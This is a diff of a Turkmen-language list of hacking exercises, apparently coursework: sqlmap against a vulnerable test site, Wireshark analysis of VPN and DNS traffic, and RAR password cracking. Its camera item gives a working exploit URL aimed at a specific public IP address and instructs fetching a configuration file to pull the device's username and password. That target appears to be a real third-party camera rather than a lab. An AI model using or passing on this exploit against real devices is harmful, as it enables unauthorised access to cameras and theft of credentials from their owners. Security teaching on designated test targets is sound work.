@@ -12,8 +12,10 @@ sqlmap --url http://testphp.vulnweb.com/login.php --crawl 2 -batch --threads 3 -
  2
  
 Wireshark-da vpn tunel arkaly geçýän maglumatlaryň gowşaklyklaryny tapmaly
+
 3 
 Wireshark ulanyp DNS protokolyny seljermeli gowşaklyklary anyklamaly.
+
 4
 Shodan.io IoT gowşaklyklaryny tapyp peýdalanmak(kamera açmaly).
 https://vk.com/@wiwosit-ekspluatiruem-uyazvimost-kamer
@@ -24,6 +26,7 @@ http://202.215.62.86:81/ yzyna şuny goş:
 system.ini?loginuse&loginpas
 http://202.215.62.86:81/system.ini?loginuse&loginpas
 Faýl ýüklär, şol ýerden ulanyjy adyny we paroly almaly
+
 
 5
 RAR faýlyň parolyny döwmeli. (LostMyPass programma).
